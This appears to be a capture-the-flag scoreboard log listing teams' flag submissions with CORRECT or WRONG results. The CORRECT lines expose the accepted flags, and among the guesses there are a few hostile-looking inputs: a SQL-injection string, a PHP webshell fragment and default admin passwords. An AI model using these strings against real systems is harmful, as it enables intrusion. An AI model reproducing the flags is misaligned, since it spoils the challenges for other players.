[03/11/2017 22:35:13] test2 submitted test with kpm 0 [CORRECT]
[04/08/2017 06:09:26] test submitted test with kpm 0 [CORRECT]
04/08/2017 06:27:56 submitted test with kpm test [ALREADY SOLVED]
04/08/2017 06:28:01 submitted test with kpm test [ALREADY SOLVED]
04/08/2017 06:28:06 submitted test with kpm test [ALREADY SOLVED]
04/08/2017 06:28:10 submitted test with kpm test [ALREADY SOLVED]
04/08/2017 06:28:47 submitted test with kpm  [ALREADY SOLVED]
04/08/2017 06:29:03 submitted test with kpm  [ALREADY SOLVED]
[05/06/2017 18:13:59] 董天董地董蛤 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:15:14] 董天董地董蛤 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:17:26] 西石油二队 submitted  with kpm 0 [WRONG]
[05/06/2017 18:17:30] 西石油二队 submitted  with kpm 1 [WRONG]
[05/06/2017 18:20:09] 不晓得取啥队伍名 submitted  with kpm 0 [WRONG]
[05/06/2017 18:20:15] 不晓得取啥队伍名 submitted  with kpm 1 [WRONG]
[05/06/2017 18:20:21] 不晓得取啥队伍名 submitted  with kpm 2 [WRONG]
[05/06/2017 18:21:20] 西石油二队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:21:27] 西石油二队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 18:21:32] 西石油二队 submitted 1e519ecdb4aca503c685dbeac5adad4d with kpm 2 [WRONG]
[05/06/2017 18:21:33] 西石油二队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 3 [WRONG]
[05/06/2017 18:23:10] 法兰街舞队 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:23:24] 西石油二队 submitted mxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:23:31] 抽象二队 submitted  with kpm 0 [WRONG]
[05/06/2017 18:23:32] 西石油二队 submitted mxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 18:23:35] 西石油二队 submitted Z3tUaDFzXzEyX3NpZ259 with kpm 2 [WRONG]
[05/06/2017 18:23:44] Flyteam2 submitted  with kpm 0 [WRONG]
[05/06/2017 18:24:35] ThreeNB submitted flag{flag} with kpm 0 [WRONG]
[05/06/2017 18:24:43] 不晓得取啥队伍名 submitted  with kpm 0 [WRONG]
[05/06/2017 18:25:06] 西石油二队 submitted Z3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:25:33] 6602 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:25:51] Flyteam1 submitted  with kpm 0 [WRONG]
[05/06/2017 18:26:09] Flyteam3 submitted  with kpm 0 [WRONG]
[05/06/2017 18:26:15] Flyteam3 submitted  with kpm 1 [WRONG]
[05/06/2017 18:26:40] Flyteam0 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:26:49] ThreeNB submitted  with kpm 0 [WRONG]
[05/06/2017 18:27:01] Flyteam1 submitted =::=::\ with kpm 0 [WRONG]
[05/06/2017 18:27:30] Flyteam0 submitted 0047BF28 with kpm 1 [WRONG]
[05/06/2017 18:27:39] 法兰街舞队 submitted mortal with kpm 0 [WRONG]
[05/06/2017 18:27:57] 西石油三队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:28:01] 西石油三队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 18:28:53] 法兰街舞队 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:29:17] Flyteam3 submitted  with kpm 0 [WRONG]
[05/06/2017 18:29:18] 西石油二队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:29:22] Flyteam3 submitted  with kpm 1 [WRONG]
[05/06/2017 18:29:56] 6602 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:30:22] 三脸懵逼 submitted flag{mxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:30:25] Flyteam2 submitted  with kpm 0 [WRONG]
[05/06/2017 18:30:29] 三脸懵逼 submitted flag{mxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:30:34] Flyteam0 submitted vbv with kpm 0 [WRONG]
[05/06/2017 18:30:38] 西石油一队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:30:45] Flyteam4 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:31:06] 笑傲江湖 submitted missing locale facet with kpm 0 [WRONG]
[05/06/2017 18:31:13] 笑傲江湖 submitted missinglocalefacet with kpm 1 [WRONG]
[05/06/2017 18:31:26] 笑傲江湖 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 2 [WRONG]
[05/06/2017 18:31:32] 笑傲江湖 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 3 [WRONG]
[05/06/2017 18:31:36] 笑傲江湖 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 4 [WRONG]
[05/06/2017 18:32:06] Flyteam1 submitted =::=::\ with kpm 0 [WRONG]
[05/06/2017 18:32:19] 笑傲江湖 submitted flag with kpm 3 [WRONG]
[05/06/2017 18:32:26] 笑傲江湖 submitted flag{missinglocalefacet} with kpm 3 [WRONG]
[05/06/2017 18:32:31] 笑傲江湖 submitted flag{missing locale facet} with kpm 4 [WRONG]
[05/06/2017 18:32:36] 不晓得取啥队伍名 submitted flag{0123456789abcdefABCDEF} with kpm 0 [WRONG]
[05/06/2017 18:32:44] 笑傲江湖 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 3 [WRONG]
[05/06/2017 18:33:05] Flyteam1 submitted _file.c with kpm 1 [WRONG]
[05/06/2017 18:33:21] ThreeNB submitted flag with kpm 0 [WRONG]
[05/06/2017 18:33:41] ThreeNB submitted flag{wlecomtosicnu} with kpm 1 [WRONG]
[05/06/2017 18:33:42] 西石油二队 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:33:44] 西石油二队 submitted xhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:33:45] ThreeNB submitted flag{wlecomtosicnu} with kpm 2 [WRONG]
[05/06/2017 18:33:49] ThreeNB submitted flag{wlecomtosicnu} with kpm 3 [WRONG]
[05/06/2017 18:34:22] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:34:24] Flyteam2 submitted 1 with kpm 0 [WRONG]
[05/06/2017 18:34:47] 西石油二队 submitted flag{mxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:35:16] zzz submitted  flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:35:32] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:36:01] 西石油三队 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:36:20] 西石油二队 submitted flag{mxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:36:25] Flyteam3 submitted d59196eb62ca95e1582f1281b7da9a08 with kpm 0 [WRONG]
[05/06/2017 18:36:33] Flyteam3 submitted 'd59196eb62ca95e1582f1281b7da9a08' with kpm 1 [WRONG]
[05/06/2017 18:36:41] 笑傲江湖 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:37:19] 不晓得取啥队伍名 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:38:01] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:38:07] 西石油二队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 18:38:19] 不晓得取啥队伍名 submitted flag{tree} with kpm 0 [WRONG]
[05/06/2017 18:39:38] 三脸懵逼 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:40:12] ThreeNB submitted flag{synt} with kpm 0 [WRONG]
[05/06/2017 18:40:23] 西石油三队 submitted flagZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:40:24] ThreeNB submitted flag{synt} with kpm 1 [WRONG]
[05/06/2017 18:40:30] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:40:35] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 2 [WRONG]
[05/06/2017 18:40:46] 西石油三队 submitted Flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 3 [WRONG]
[05/06/2017 18:42:07] Flyteam0 submitted 'or 1=1/* with kpm 0 [WRONG]
[05/06/2017 18:42:17] Flyteam5 submitted  with kpm 0 [WRONG]
[05/06/2017 18:43:32] Flyteam3 submitted Are u gaoshing? with kpm 0 [WRONG]
[05/06/2017 18:43:38] 西石油一队 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:43:43] 董天董地董蛤 submitted flag{6595b64144ccf1df} with kpm 0 [WRONG]
[05/06/2017 18:43:47] 董天董地董蛤 submitted flag{6595b64144ccf1df} with kpm 1 [WRONG]
[05/06/2017 18:44:03] 抽象二队 submitted 111111 with kpm 0 [WRONG]
[05/06/2017 18:44:23] 西石油二队 submitted  with kpm 0 [WRONG]
[05/06/2017 18:44:28] 西石油二队 submitted 1 with kpm 1 [WRONG]
[05/06/2017 18:45:21] WHT submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 18:45:52] 抽象二队 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:47:03] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:47:30] Flyteam2 submitted admin with kpm 0 [WRONG]
[05/06/2017 18:47:42] Flyteam2 submitted admin888 with kpm 1 [WRONG]
[05/06/2017 18:47:49] 三脸懵逼 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:48:30] 西石油三队 submitted 3[]3_3B3D3Q3\30303030303030 with kpm 0 [WRONG]
[05/06/2017 18:48:35] 西石油三队 submitted ]3_3B3D3Q3\30303030303030 with kpm 1 [WRONG]
[05/06/2017 18:48:37] Flyteam5 submitted key_is_here with kpm 0 [WRONG]
[05/06/2017 18:48:45] Flyteam5 submitted key_is_here with kpm 1 [WRONG]
[05/06/2017 18:48:47] 西石油三队 submitted 3]]3_3B3D3Q3\30303030303030 with kpm 2 [WRONG]
[05/06/2017 18:48:53] ThreeNB submitted flag{hello_everyone} with kpm 0 [WRONG]
[05/06/2017 18:48:55] 西石油三队 submitted 3]_3B3D3Q3\30303030303030 with kpm 3 [WRONG]
[05/06/2017 18:49:02] ThreeNB submitted flag{Hello_everyone} with kpm 1 [WRONG]
[05/06/2017 18:49:12] ThreeNB submitted flag{Hello everyone} with kpm 2 [WRONG]
[05/06/2017 18:49:19] ThreeNB submitted flag{hello everyone} with kpm 3 [WRONG]
[05/06/2017 18:50:35] ThreeNB submitted flag{hello_everyone} with kpm 0 [WRONG]
[05/06/2017 18:50:46] 三脸懵逼 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:50:49] ThreeNB submitted flag{hello_world} with kpm 1 [WRONG]
[05/06/2017 18:50:57] 三脸懵逼 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 18:51:39] ThreeNB submitted flag{hello_world} with kpm 1 [WRONG]
[05/06/2017 18:52:40] 西石油一队 submitted flag{mxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:52:53] ThreeNB submitted flag{its_so_easy} with kpm 0 [WRONG]
[05/06/2017 18:53:11] ThreeNB submitted flag{hellow_world} with kpm 1 [WRONG]
[05/06/2017 18:53:22] ThreeNB submitted flag{hellow_everyone} with kpm 2 [WRONG]
[05/06/2017 18:54:07] Flyteam4 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 18:55:56] 西石油三队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:56:00] 西石油三队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 18:56:06] 西石油二队 submitted flag with kpm 0 [WRONG]
[05/06/2017 18:57:19] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 18:57:51] 三脸懵逼 submitted flag{zmxhZ3tuadfzxzeyx3npz259} with kpm 0 [WRONG]
[05/06/2017 18:58:04] Flyteam5 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 18:58:13] Flyteam5 submitted flag(ZmxhZ3tUaDFzXzEyX3NpZ259) with kpm 1 [WRONG]
[05/06/2017 18:58:29] Flyteam5 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 2 [WRONG]
[05/06/2017 18:58:58] Flyteam5 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 3 [WRONG]
[05/06/2017 18:59:05] 三脸懵逼 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 19:00:05] Flyteam1 submitted HEAP_NO_SERIALIZE with kpm 0 [WRONG]
[05/06/2017 19:00:28] Flyteam1 submitted serialize with kpm 1 [WRONG]
[05/06/2017 19:00:33] Flyteam5 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 19:01:04] Flyteam5 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 1 [WRONG]
[05/06/2017 19:01:18] 不晓得取啥队伍名 submitted flag with kpm 0 [WRONG]
[05/06/2017 19:01:51] Flyteam5 submitted flag{Th1s_12_sign} with kpm 1 [CORRECT]
[05/06/2017 19:03:41] test submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 0 [WRONG]
[05/06/2017 19:03:47] test submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 1 [WRONG]
[05/06/2017 19:03:52] test submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 2 [WRONG]
[05/06/2017 19:05:32] Flyteam3 submitted base64_decode($_GET[$cmd]) with kpm 0 [WRONG]
[05/06/2017 19:06:04] ThreeNB submitted flag{hellow_ctf} with kpm 0 [WRONG]
[05/06/2017 19:06:21] ThreeNB submitted flag{welcome_to_ctf} with kpm 1 [WRONG]
[05/06/2017 19:06:37] ThreeNB submitted flag{welcome_to_sicnuctf} with kpm 2 [WRONG]
[05/06/2017 19:07:11] ThreeNB submitted flag{hellow_login} with kpm 2 [WRONG]
[05/06/2017 19:07:30] Flyteam1 submitted 4096 with kpm 0 [WRONG]
[05/06/2017 19:07:31] ThreeNB submitted flag{_hellow_login} with kpm 2 [WRONG]
[05/06/2017 19:08:40] Flyteam4 submitted 1234 with kpm 0 [WRONG]
[05/06/2017 19:08:50] Flyteam4 submitted 1234123 with kpm 1 [WRONG]
[05/06/2017 19:09:19] 三脸懵逼 submitted flag{n52V_jrU6d_kx8zw} with kpm 0 [WRONG]
[05/06/2017 19:09:29] 三脸懵逼 submitted flag{n52V-jrU6d-kx8zw} with kpm 1 [WRONG]
[05/06/2017 19:10:42] 抽象二队 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 19:11:02] 抽象二队 submitted flag{Th1s_12_sign} with kpm 0 [WRONG]
[05/06/2017 19:11:17] 抽象二队 submitted flag{Th1s_12_sign} with kpm 1 [WRONG]
[05/06/2017 19:11:24] 抽象二队 submitted flag{Th1s_12_sign} with kpm 2 [WRONG]
[05/06/2017 19:11:29] 抽象二队 submitted flag{Th1s_12_sign} with kpm 3 [WRONG]
05/06/2017 19:11:38 submitted 抽象二队 with kpm flag{Th1s_12_sign} [ALREADY SOLVED]
[05/06/2017 19:11:42] 笑傲江湖 submitted  with kpm 0 [WRONG]
[05/06/2017 19:11:54] 三脸懵逼 submitted flag{Kfw_qmmh_uvecx_mawc_dk_mcpw} with kpm 0 [WRONG]
[05/06/2017 19:12:02] 三脸懵逼 submitted flag{Kfwqmmhuvecxmawcdkmcpw} with kpm 1 [WRONG]
[05/06/2017 19:13:01] 冰血封情 submitted flag{U2FsdGVkX1+kkrlAEcMeC4hVx5qRnhOPZG/L6xPk4CQ=} with kpm 0 [WRONG]
[05/06/2017 19:14:13] 西石油一队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 19:14:58] ThreeNB submitted flag{are_u_gaoshing} with kpm 0 [WRONG]
[05/06/2017 19:15:09] ThreeNB submitted flag{are_u_gaoxing} with kpm 1 [WRONG]
[05/06/2017 19:15:19] ThreeNB submitted flag{are_u_gao-xing} with kpm 2 [WRONG]
[05/06/2017 19:15:36] ThreeNB submitted flag{are_u_gao_xing} with kpm 3 [WRONG]
[05/06/2017 19:15:39] 法兰街舞队 submitted flag{wclcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 19:15:45] ThreeNB submitted flag{are_u_gao_shing} with kpm 4 [WRONG]
[05/06/2017 19:15:51] Flyteam3 submitted "Are u gaoshing?" with kpm 0 [WRONG]
[05/06/2017 19:15:55] 法兰街舞队 submitted |l{g{wclcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 19:15:56] Flyteam3 submitted Are u gaoshing? with kpm 1 [WRONG]
[05/06/2017 19:16:24] 西石油三队 submitted flag{3]]3_3B3D3Q3\30303030303030} with kpm 0 [WRONG]
[05/06/2017 19:16:48] 西石油三队 submitted flag{]3_3B3D3Q3\30303030303030} with kpm 1 [WRONG]
[05/06/2017 19:16:52] 西石油三队 submitted flag{ ]3_3B3D3Q3\30303030303030 } with kpm 2 [WRONG]
[05/06/2017 19:16:53] 西石油一队 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 19:17:56] 死亡地平线 submitted 2!!22222222222222222222222222222222222222222222222222 with kpm 0 [WRONG]
[05/06/2017 19:18:07] 死亡地平线 submitted 2!!22222222222222222222222222222222222222222222222222 with kpm 1 [WRONG]
[05/06/2017 19:18:19] 西石油三队 submitted flag{ZmxhZ3tUaDFzX3NpZ} with kpm 0 [WRONG]
[05/06/2017 19:18:58] 6602 submitted flag{490e1616bdf534fdf1ecd7a0a46560b9} with kpm 0 [WRONG]
[05/06/2017 19:19:09] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ} with kpm 1 [WRONG]
[05/06/2017 19:19:22] 西石油三队 submitted  with kpm 1 [WRONG]
05/06/2017 19:19:32 submitted 西石油三队 with kpm  [ALREADY SOLVED]
[05/06/2017 19:19:33] 法兰街舞队 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 19:20:09] 6602 submitted flag{490e1616bdf534fdf1ecd7a0a46560b9} with kpm 0 [WRONG]
[05/06/2017 19:20:14] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 19:20:15] 6602 submitted RE2 flag{welcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 19:20:25] 6602 submitted flag{welcome_T0_sICnuISA} with kpm 2 [CORRECT]
[05/06/2017 19:21:06] 董天董地董蛤 submitted flag{ZoneId=3} with kpm 0 [WRONG]
[05/06/2017 19:21:24] 不晓得取啥队伍名 submitted flag{stream} with kpm 0 [WRONG]
[05/06/2017 19:23:26] 三脸懵逼 submitted flag{i8w924jp694jw4l44i897ww19w9jj94j} with kpm 0 [WRONG]
[05/06/2017 19:23:37] 三脸懵逼 submitted flag{m8a924nt694na4p44m897aa19a9nn94n} with kpm 1 [WRONG]
[05/06/2017 19:23:48] 三脸懵逼 submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 2 [WRONG]
[05/06/2017 19:23:51] Flyteam1 submitted fuckbich with kpm 0 [WRONG]
[05/06/2017 19:23:52] 董天董地董蛤 submitted flag{1bab78a0fb6fd5f124fa9397802a57fb} with kpm 0 [WRONG]
[05/06/2017 19:23:57] 三脸懵逼 submitted flag{d8r924ek694er4g44d897rr19r9ee94e} with kpm 3 [WRONG]
[05/06/2017 19:24:08] 三脸懵逼 submitted flag{f8t924gm694gt4i44f897tt19t9gg94g} with kpm 4 [WRONG]
[05/06/2017 19:24:17] 三脸懵逼 submitted flag{i8w924jp694jw4l44i897ww19w9jj94j} with kpm 5 [WRONG]
[05/06/2017 19:24:26] 三脸懵逼 submitted flag{m8a924nt694na4p44m897aa19a9nn94n} with kpm 6 [WRONG]
[05/06/2017 19:24:36] 三脸懵逼 submitted flag{r8f924sy694sf4u44r897ff19f9ss94s} with kpm 6 [WRONG]
[05/06/2017 19:24:45] 三脸懵逼 submitted flag{x8l924ye694yl4a44x897ll19l9yy94y} with kpm 6 [WRONG]
[05/06/2017 19:24:53] 三脸懵逼 submitted flag{e8s924fl694fs4h44e897ss19s9ff94f} with kpm 6 [WRONG]
[05/06/2017 19:25:01] 三脸懵逼 submitted flag{m8a924nt694na4p44m897aa19a9nn94n} with kpm 6 [WRONG]
[05/06/2017 19:25:10] 三脸懵逼 submitted flag{v8j924wc694wj4y44v897jj19j9ww94w} with kpm 6 [WRONG]
[05/06/2017 19:25:20] 三脸懵逼 submitted flag{f8t924gm694gt4i44f897tt19t9gg94g} with kpm 6 [WRONG]
[05/06/2017 19:25:23] 董天董地董蛤 submitted flag{Zone.Identifier} with kpm 0 [WRONG]
[05/06/2017 19:25:30] 三脸懵逼 submitted flag{q8e924rx694re4t44q897ee19e9rr94r} with kpm 6 [WRONG]
[05/06/2017 19:25:39] 三脸懵逼 submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 6 [WRONG]
[05/06/2017 19:25:47] 三脸懵逼 submitted flag{p8d924qw694qd4s44p897dd19d9qq94q} with kpm 6 [WRONG]
[05/06/2017 19:25:52] Flyteam3 submitted noting there with kpm 0 [WRONG]
[05/06/2017 19:25:53] Flyteam1 submitted z with kpm 0 [WRONG]
[05/06/2017 19:25:57] 三脸懵逼 submitted flag{d8r924ek694er4g44d897rr19r9ee94e} with kpm 6 [WRONG]
[05/06/2017 19:25:58] Flyteam1 submitted zmjd with kpm 1 [WRONG]
[05/06/2017 19:25:59] Flyteam3 submitted nothing there with kpm 1 [WRONG]
[05/06/2017 19:26:01] Flyteam1 submitted zmjda with kpm 2 [WRONG]
[05/06/2017 19:26:05] 三脸懵逼 submitted flag{s8g924tz694tg4v44s897gg19g9tt94t} with kpm 6 [WRONG]
[05/06/2017 19:26:10] Flyteam1 submitted zhemejiandan with kpm 3 [WRONG]
[05/06/2017 19:26:12] Flyteam1 submitted zhemejiandana with kpm 4 [WRONG]
[05/06/2017 19:26:14] 三脸懵逼 submitted flag{i8w924jp694jw4l44i897ww19w9jj94j} with kpm 6 [WRONG]
[05/06/2017 19:26:15] Flyteam1 submitted zhemejiandan a with kpm 5 [WRONG]
[05/06/2017 19:26:16] Flyteam1 submitted zhemejiandan a with kpm 6 [WRONG]
[05/06/2017 19:26:22] 三脸懵逼 submitted flag{z8n924ag694an4c44z897nn19n9aa94a} with kpm 6 [WRONG]
[05/06/2017 19:26:32] 三脸懵逼 submitted flag{r8f924sy694sf4u44r897ff19f9ss94s} with kpm 6 [WRONG]
[05/06/2017 19:26:40] 西石油三队 submitted flag{00000} with kpm 0 [WRONG]
[05/06/2017 19:26:42] 三脸懵逼 submitted flag{k8y924lr694ly4n44k897yy19y9ll94l} with kpm 6 [WRONG]
[05/06/2017 19:26:42] Flyteam3 submitted nothing there with kpm 2 [WRONG]
[05/06/2017 19:26:45] 西石油三队 submitted flag{0000} with kpm 1 [WRONG]
[05/06/2017 19:26:50] 三脸懵逼 submitted flag{e8s924fl694fs4h44e897ss19s9ff94f} with kpm 6 [WRONG]
[05/06/2017 19:26:58] 三脸懵逼 submitted flag{z8n924ag694an4c44z897nn19n9aa94a} with kpm 6 [WRONG]
[05/06/2017 19:27:12] 三脸懵逼 submitted flag{v8j924wc694wj4y44v897jj19j9ww94w} with kpm 6 [WRONG]
[05/06/2017 19:27:13] Flyteam3 submitted nothing there with kpm 1 [WRONG]
[05/06/2017 19:27:34] Flyteam3 submitted  with kpm 2 [WRONG]
[05/06/2017 19:27:38] 三脸懵逼 submitted flag{s8g924tz694tg4v44s897gg19g9tt94t} with kpm 4 [WRONG]
[05/06/2017 19:27:38] Flyteam3 submitted  with kpm 3 [WRONG]
[05/06/2017 19:27:42] Flyteam3 submitted  with kpm 4 [WRONG]
[05/06/2017 19:27:46] Flyteam3 submitted sercet in the_next.php with kpm 4 [WRONG]
[05/06/2017 19:27:46] 三脸懵逼 submitted flag{q8e924rx694re4t44q897ee19e9rr94r} with kpm 4 [WRONG]
[05/06/2017 19:27:51] 西石油三队 submitted flag{missing locale facet} with kpm 0 [WRONG]
[05/06/2017 19:27:56] 三脸懵逼 submitted flag{p8d924qw694qd4s44p897dd19d9qq94q} with kpm 4 [WRONG]
[05/06/2017 19:28:12] Flyteam3 submitted sercet in the_next.php with kpm 5 [WRONG]
[05/06/2017 19:28:22] Flyteam3 submitted nothing there with kpm 5 [WRONG]
[05/06/2017 19:28:38] Flyteam3 submitted sercet in the_next.php with kpm 4 [WRONG]
[05/06/2017 19:29:01] test submitted flag{sicnuisasher} with kpm 0 [WRONG]
[05/06/2017 19:29:10] Flyteam3 submitted 999999999999999999999999999999999999999997  with kpm 3 [WRONG]
[05/06/2017 19:31:23] test submitted flag{MyAndroid} with kpm 0 [WRONG]
[05/06/2017 19:31:27] test submitted flag{MyAndroid} with kpm 1 [WRONG]
[05/06/2017 19:31:38] test submitted flag{MyAndroid} with kpm 2 [WRONG]
[05/06/2017 19:31:46] Flyteam3 submitted sercet in the_next.php with kpm 0 [WRONG]
[05/06/2017 19:32:25] Flyteam3 submitted nothing there with kpm 1 [WRONG]
[05/06/2017 19:33:41] WHT submitted flag{n52V-jpU6d_kx8zw} with kpm 0 [WRONG]
[05/06/2017 19:34:19] 西石油三队 submitted flag{he value of ESP was not properly saved across a function call.  This is usually a result of calling } with kpm 0 [WRONG]
[05/06/2017 19:34:46] 西石油三队 submitted flag{he value of ESP was not properly saved across a function call.  This is usually a result of calling} with kpm 1 [WRONG]
[05/06/2017 19:35:11] 笑傲江湖 submitted flag{syn} with kpm 0 [WRONG]
[05/06/2017 19:35:18] 笑傲江湖 submitted flag{SYN} with kpm 1 [WRONG]
[05/06/2017 19:35:22] 笑傲江湖 submitted flag{22} with kpm 2 [WRONG]
[05/06/2017 19:35:29] 笑傲江湖 submitted flag{87} with kpm 3 [WRONG]
[05/06/2017 19:35:40] 死亡地平线 submitted 	9fe7b95f0361d82e with kpm 0 [WRONG]
[05/06/2017 19:35:44] 笑傲江湖 submitted flag with kpm 4 [WRONG]
[05/06/2017 19:35:45] 死亡地平线 submitted 9fe7b95f0361d82e with kpm 1 [WRONG]
[05/06/2017 19:35:50] 笑傲江湖 submitted flag{syn} with kpm 5 [WRONG]
[05/06/2017 19:35:54] 笑傲江湖 submitted flag{SYN} with kpm 6 [WRONG]
[05/06/2017 19:35:58] 笑傲江湖 submitted flag22} with kpm 7 [WRONG]
[05/06/2017 19:36:02] 笑傲江湖 submitted flag{22} with kpm 8 [WRONG]
[05/06/2017 19:36:11] 笑傲江湖 submitted flag{AW} with kpm 8 [WRONG]
[05/06/2017 19:37:18] 董天董地董蛤 submitted flag{0u77057549uz06647zyw8z0y4089uz8z} with kpm 0 [WRONG]
[05/06/2017 19:37:30] 董天董地董蛤 submitted flag{0u77057549uz06647zyw8z0y4089uz8z} with kpm 1 [WRONG]
[05/06/2017 19:39:13] 董天董地董蛤 submitted flag{0a77057549af06647fec8f0e4089af8f} with kpm 0 [WRONG]
[05/06/2017 19:39:22] 董天董地董蛤 submitted flag{0a77057549af06647fec8f0e4089af8f} with kpm 1 [WRONG]
[05/06/2017 19:39:36] test submitted flag{0} with kpm 0 [WRONG]
[05/06/2017 19:39:40] ThreeNB submitted 1730340791125459199119346723994991615033459117816245501335191224980111117243681514 with kpm 0 [WRONG]
[05/06/2017 19:40:04] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 19:40:09] Flyteam1 submitted 666 with kpm 0 [WRONG]
[05/06/2017 19:40:24] test submitted flag{false} with kpm 1 [WRONG]
[05/06/2017 19:40:24] 西石油二队 submitted Flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 19:40:26] 笑傲江湖 submitted flag with kpm 0 [WRONG]
